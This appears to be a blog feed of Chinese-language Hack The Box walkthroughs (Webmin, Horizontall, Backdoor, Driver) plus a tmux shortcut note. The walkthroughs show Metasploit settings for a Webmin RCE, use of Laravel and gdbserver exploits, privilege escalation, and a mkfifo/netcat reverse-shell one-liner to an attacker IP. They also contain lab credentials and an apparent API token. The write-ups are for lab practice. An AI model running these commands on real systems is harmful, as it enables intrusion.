yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> password computer2008</span><br><span class="line">password =&gt; computer2008</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> rhosts 10.10.10.160</span><br><span class="line">rhosts =&gt; 10.10.10.160</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> ssl <span class="literal">true</span></span><br><span class="line">[!] Changing the SSL option<span class="string">&#x27;s value may require changing RPORT!</span></span><br><span class="line"><span class="string">ssl =&gt; true</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; show options </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Module options (exploit/linux/http/webmin_packageup_rce):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name       Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----       ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   PASSWORD   computer2008     yes       Webmin Password</span></span><br><span class="line"><span class="string">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span></span><br><span class="line"><span class="string">   RHOSTS     10.10.10.160     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span></span><br><span class="line"><span class="string">   RPORT      10000            yes       The target port (TCP)</span></span><br><span class="line"><span class="string">   SSL        true             no        Negotiate SSL/TLS for outgoing connections</span></span><br><span class="line"><span class="string">   TARGETURI  /                yes       Base path for Webmin application</span></span><br><span class="line"><span class="string">   USERNAME                    yes       Webmin Username</span></span><br><span class="line"><span class="string">   VHOST                       no        HTTP server virtual host</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload options (cmd/unix/reverse_perl):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name   Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----   ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   LHOST                   yes       The listen address (an interface may be specified)</span></span><br><span class="line"><span class="string">   LPORT  4444             yes       The listen port</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Exploit target:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Id  Name</span></span><br><span class="line"><span class="string">   --  ----</span></span><br><span class="line"><span class="string">   0   Webmin &lt;= 1.910</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set username Matt</span></span><br><span class="line"><span class="string">username =&gt; Matt</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set lhost 10.10.14.9</span></span><br><span class="line"><span class="string">lhost =&gt; 10.10.14.9</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set ssl true</span></span><br><span class="line"><span class="string">[!] Changing the SSL option&#x27;</span>s value may require changing RPORT!</span><br><span class="line">ssl =&gt; <span class="literal">true</span></span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/6427bab560c04677b571daeed8ba6947.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Horizontall</title>
    <url>/2022/01/09/Horizontall/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>目标主机只开放了ssh和web服务<br><img src="https://img-blog.csdnimg.cn/c6ea98b32b994a8f8a0cf9c759db1cee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们直接访问web服务，发现是一个正常的网页，扫描目录也没有发现有价值的信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u <span class="string">&quot;http://horizontall.htb/&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/common.txt -e 404,500 -t 50</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/f6b30b44e96d409f934b299e104245eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>那我们将注意力转移到子域名上，对子域名进行深入挖掘，发现了一个子域名，那么我们可以实施旁站注入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2cf9c69827e84e87b9616816c817376d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问这个页面时发现使用的是<code>strapi</code>这个CMS<br><img src="https://img-blog.csdnimg.cn/3724c08fac2d427f80427e762141b930.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们依照这个路径进行路径的扫描，发现存在一个admin目录，我们访问发现会跳转到登录表单上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u <span class="string">&quot;http://api-prod.horizontall.htb/&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e 404,500 -t 50</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/19c0c71aaef14180949dead326bc5c37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>尝试了一遍SQL注入，发现不存在SQL注入的问题。那我们转向中间件漏洞这个方向上，在EDB上查找到存在一个密码重置的RCE漏洞<br><img src="https://img-blog.csdnimg.cn/fd1458a74a574a918911ef0a1ae87cfe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/acf1f0e8aea34dacb917647d4ee1f190.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们编辑为一个exp文件，并执行它获取到一个用户交互的shell终端。这里显示用户名和密码是<code>admin:SuperStrongPassword1</code><br><img src="https://img-blog.csdnimg.cn/d93aa5dc52404922aadb13f884d33ccf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>登录进页面发现存在文件上传点，但是这个并不能进行文件上传getshell<br><img src="https://img-blog.csdnimg.cn/8b81cd2146e843a5941549c0bfe46564.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们发现这个EXP是存在RCE命令执行的功能的，那我们可以在交互终端上进行反弹一个shell给我们<br><img src="https://img-blog.csdnimg.cn/88522af59e4e42d2bd77c449691c2e62.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们将linpeas.sh脚本下载到目标机器上，尝试看看有没有存在提权的突破点<br><img src="https://img-blog.csdnimg.cn/a7e43564181146d0b3e82efaac54674a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>运行脚本后，但是我们并没有发现任何可提权的点，但是我们查看主机运行的端口可以发现，主机的1337端口正在以root身份运行程序，由于我们用nmap无法扫描出该端口，可以推断主机做了内网端口的转发。<br><img src="https://img-blog.csdnimg.cn/0638be03f2764c3f9db143944921a40f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们可以使用frp进行内网的端口复用，首先先将<code>frpc</code>和<code>frpc.ini</code>上传到目标主机上，上传成功后设置好我们本机的ip地址和要转发本地端口和远程端口<br><img src="https://img-blog.csdnimg.cn/5b03de7f59a043c887497c243c893d3d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在目标机器和本机上分别开启监听服务<br><img src="https://img-blog.csdnimg.cn/28bf83b3599646c89714b357a407787f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们访问本机的8000端口，发现是一个由Laravel框架搭建起来的网页程序<br><img src="https://img-blog.csdnimg.cn/8581ba2866b940708a56f715327a7152.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这个应用程序近年发现一个存在RCE的漏洞，在github上可以搜到对应的EXP漏洞利用脚本，并执行可见漏洞利用成功<br><a href="https://github.com/LucifielHack/CVE-2021-3129_exploit">https://github.com/LucifielHack/CVE-2021-3129_exploit</a><br><img src="https://img-blog.csdnimg.cn/e95aaf54fdb343a199cf7ec03bc27d52.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们可以反弹一个root的shell到本机上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./exploit.py http://localhost:8000 Monolog/RCE1 <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.25 4445 &gt;/tmp/f&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/9d4a8f62eb834cb78ddc826a02de9132.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/db008ce7bfb14ce78f99c0d2534651e1.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>中间件</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/01/09/tmux%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<h1 id="tmux常用快捷键"><a href="#tmux常用快捷键" class="headerlink" title="tmux常用快捷键"></a>tmux常用快捷键</h1><h2 id="Ctrl-B-：垂直切割"><a href="#Ctrl-B-：垂直切割" class="headerlink" title="Ctrl+B+% ：垂直切割"></a>Ctrl+B+% ：垂直切割</h2><p><img src="https://img-blog.csdnimg.cn/9a0a7180dae946beab3aad3276c1d766.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<h2 id="Ctrl-B-”-：水平切割"><a href="#Ctrl-B-”-：水平切割" class="headerlink" title="Ctrl+B+” ：水平切割"></a>Ctrl+B+” ：水平切割</h2><p><img src="https://img-blog.csdnimg.cn/70ecdf4c06bf460890a2cbde51f25770.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<span id="more"></span>

<h2 id="Ctrl-B-o-：切换窗口"><a href="#Ctrl-B-o-：切换窗口" class="headerlink" title="Ctrl+B+o ：切换窗口"></a>Ctrl+B+o ：切换窗口</h2><p><img src="https://img-blog.csdnimg.cn/9938e474239449b4ae08d755416f0067.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<!--more-->

<h2 id="Ctrl-B-：滑动滚轮查看，按Ctrl-：取消当前状态"><a href="#Ctrl-B-：滑动滚轮查看，按Ctrl-：取消当前状态" class="headerlink" title="Ctrl+B+[ ：滑动滚轮查看，按Ctrl+[ ：取消当前状态"></a>Ctrl+B+[ ：滑动滚轮查看，按Ctrl+[ ：取消当前状态</h2><p><img src="https://img-blog.csdnimg.cn/53014b87bb444b46804a88388407213a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<h2 id="Ctrl-B-z：对当前窗口进行全屏显示，再按Ctrl-z取消当前状态"><a href="#Ctrl-B-z：对当前窗口进行全屏显示，再按Ctrl-z取消当前状态" class="headerlink" title="Ctrl+B+z：对当前窗口进行全屏显示，再按Ctrl+z取消当前状态"></a>Ctrl+B+z：对当前窗口进行全屏显示，再按Ctrl+z取消当前状态</h2><p><img src="https://img-blog.csdnimg.cn/90618e8faace419c8a87e91f4636e7ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<h2 id="Ctrl-B-t：显示当前时间"><a href="#Ctrl-B-t：显示当前时间" class="headerlink" title="Ctrl+B+t：显示当前时间"></a>Ctrl+B+t：显示当前时间</h2><p><img src="https://img-blog.csdnimg.cn/cf7410461f82438da252e6c633cad922.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>Backdoor</title>
    <url>/2022/01/04/Backdoor/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现目标主机开放了ssh和web服务<br><img src="https://img-blog.csdnimg.cn/91c55463b8894dfc8281797fa545de3c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们将<code>backdoor.htb</code>添加到hosts文件中后，访问web服务，发现是一个WordPress页面，并且版本是<code>5.8.1</code><br><img src="https://img-blog.csdnimg.cn/fc20025359b542d092eda73dfd36dc39.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>既然是wordpress，那么我们可以直接使用wpscan来扫描存在哪些漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://backdoor.htb/ --api-token X4CFiaLdgwD6FwDMhkrZMpNjFDZ7Ex6DWqlcPM9DVic --enumerate p,u --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/c7c8fb81233a4b49b06e3d757078c9dd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现存在一个组件漏洞，路径是<code>http://backdoor.htb/wp-content/plugins/akismet/</code>，我们访问其上一级目录发现是ebook的插件<br><img src="https://img-blog.csdnimg.cn/59ce377ff44443e0ae407e8028b768a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们在EDB上发现了这个组件存在目录穿越漏洞<br><img src="https://img-blog.csdnimg.cn/c15aaa1c2f99402aa234d95d4ba7d7ff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们访问其路径，并将wp-config.php文件下载保存下来，发现了mysql的用户名和密码<br><img src="https://img-blog.csdnimg.cn/9276f5329d5444d1a4e7f701f2b2b3e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是我们到后台进行登录时发现无论是<code>admin</code>和<code>wordpressuser</code>都是登陆失败的<br><img src="https://img-blog.csdnimg.cn/d7d52ae101994365b067e0463284ecec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们只能切换另一个思路了，上面我们说到时存在一个LFI漏洞的。我们可以使用LFISuite进行路径的检测<br><img src="https://img-blog.csdnimg.cn/12af5d4372a042a783fd87b77f83506d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们虽然可以找到passwd文件，但是并没有任何的作用<br><img src="https://img-blog.csdnimg.cn/be7eb457f68b4b6799558545455b690c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们可以查看目标主机都在运行那些进程，通过传入<code>/proc/pid/cmdline</code>这个路径参数，其中pid的值我们可以进行模糊，并用burpsuite进行抓包分析。其中为什么要这么做，这是Linux 文件系统层次结构的文章解析链接<a href="https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html">https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html</a><br><img src="https://img-blog.csdnimg.cn/bffa7223627d4dfe8db4b137b4984909.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2a11eb47eaea430685df1782909d56fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们发现进程号为793的进程，在本机的1337端口上运行这一个<code>gdbserver</code>这样一个程序<br><img src="https://img-blog.csdnimg.cn/f4483a61544247d282456891a4d1f1dc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h3><p>我们在EDB中发现了gdbserver这个程序是存在漏洞的<br><img src="https://img-blog.csdnimg.cn/abd8f238cf054450a79a3a3d13e79783.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们将其内容保存为exp.py文件，然后按照提示先生成一个rev.bin文件<br><img src="https://img-blog.csdnimg.cn/54d8c0fbe2bc4a9590f41b6770b2bee0.png" alt="在这里插入图片描述"><br>然后开启监听，运行我们的exp并获取目标主机的shell<br><img src="https://img-blog.csdnimg.cn/1da19bb296474d1fa28f040adfacede6.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6b571bba98c44cfe92c049f327069088.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h3 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h3><p>我们可以直接通过MSF程序获取目标主机的shell，并设置对应的参数项<br><img src="https://img-blog.csdnimg.cn/a0817ecc48414e04ba28a8126f1f05a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后提示这个payload运行错误，原因是主机并不是32位的，是64位的<br><img src="https://img-blog.csdnimg.cn/c9995cd3ea9b4b509c347aa0508635b0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们把参数设置为64位再运行即可<br><img src="https://img-blog.csdnimg.cn/5ab52ced97f449338a1cd14d20707741.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0950beedec5c4b9894654396d09fd96c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们将<code>linpeas.sh</code>这个文件上传到目标主机上并运行它<br><img src="https://img-blog.csdnimg.cn/ace832b109ac4ca391a07343bc66a62b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现存在这么一个可疑的进程是可能存在漏洞利用的<br><img src="https://img-blog.csdnimg.cn/9219d9c4acde429db32f97840917256e.png" alt="在这里插入图片描述"><br>我们使用pspy程序监听一下主机的进程<br><img src="https://img-blog.csdnimg.cn/a2824fa9dada431e948761bc432f95f6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现这个进程是每休眠一段时间就会再次运行，并且都是以root身份来运行的<br><img src="https://img-blog.csdnimg.cn/597c98a3121744a98ac64e76c51564aa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们可以看到我们现在使用的终端是dumb<br><img src="https://img-blog.csdnimg.cn/9e65175ae79346ecb3631d670afba0e1.png" alt="在这里插入图片描述"><br>我们要将其设置为xterm终端<br><img src="https://img-blog.csdnimg.cn/eab51c482a6c47ef9827e3de470b933f.png" alt="在这里插入图片描述"><br>然后查看screen的帮助命令发现，-x参数可以帮我们直接进入另一个终端界面，因为screen程序是以root身份运行的，所以我们能直接进入root终端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -x root/root</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/c8e276d5bacf4eeba50d6692a9160185.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>LFI</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Driver</title>
    <url>/2022/01/01/Driver/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现目标主机开放了web服务和SMB服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~&#x2F;Desktop]</span><br><span class="line">└─# bash nmap.sh 10.10.11.106                                                                                                                 1 ⚙</span><br><span class="line">Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-01 02:43 EST</span><br><span class="line">Nmap scan report for 10.10.11.106</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80&#x2F;tcp   open  http         Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP&#x2F;1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm&#x3D;MFP Firmware Update Center. Please enter password for admin</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">135&#x2F;tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">5985&#x2F;tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">Service Info: Host: DRIVER; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-01-01T14:43:35</span><br><span class="line">|_  start_date: 2022-01-01T14:37:37</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3.1.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 53.61 seconds</span><br></pre></td></tr></table></figure>
<p>我们访问web服务时，提示我们要输入账号和密码，我们使用admin/admin登录成功</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/c4d2b8fafacf4a7e83de610beea75a59.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>登录页面时发现是台打印机，我们点击<code>Fireware Updates</code>页面，发现类似文件上传的页面<br><img src="https://img-blog.csdnimg.cn/2e214c05a4a54abcba4a54c4b911d11f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><!--more-->

